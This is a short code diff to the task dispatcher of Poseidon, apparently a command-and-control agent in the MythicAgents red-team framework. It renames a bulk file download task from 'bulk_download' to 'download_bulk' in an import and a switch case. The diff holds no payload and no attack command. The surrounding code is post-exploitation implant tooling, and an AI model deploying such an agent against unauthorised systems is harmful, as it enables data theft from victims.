@@ -64,7 +64,7 @@ import (
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/update_c2"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/upload"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/xpc"
-	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/bulk_download"
+	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/download_bulk"
 	"os"
 )
 
@@ -205,8 +205,8 @@ func listenForNewTask() {
 			go lsopen.Run(task)
 		case "chmod":
 			go chmod.Run(task)
-		case "bulk_download":
-			go bulk_download.Run(task)
+		case "download_bulk":
+			go download_bulk.Run(task)
 		default:
 			// No tasks, do nothing
 			break
